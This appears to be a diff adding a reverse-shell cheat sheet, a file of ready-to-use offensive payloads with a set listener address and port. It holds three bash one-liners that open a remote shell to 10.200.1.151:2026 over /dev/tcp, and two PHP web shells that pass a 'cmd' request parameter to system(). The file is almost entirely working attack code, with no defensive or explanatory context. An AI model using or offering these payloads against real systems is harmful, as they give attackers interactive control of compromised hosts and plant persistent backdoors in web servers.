@@ -1,0 +1,40 @@
+title: "Reverse Shell Payload Structures"
+tags: ["reverse shell", "payload", "hacking", "examples"]
+category: "Security Documentation"
+default_template_IP: "10.10.10.10"
+default_template_listening_port: "9001"
+user_IP": "10.200.1.151
+user_listening_port: "2026"
+
+
+Bash -i:
+sh -i >& /dev/tcp/10.200.1.151/2026 0>&1
+
+bash 196:
+0<&196;exec 196<>/dev/tcp/10.200.1.151/2026; sh <&196 >&196 2>&196
+
+Bash read line:
+exec 5<>/dev/tcp/10.200.1.151/2026;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+PHP cmd:
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+
+PHP cmd 2:
+<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
+
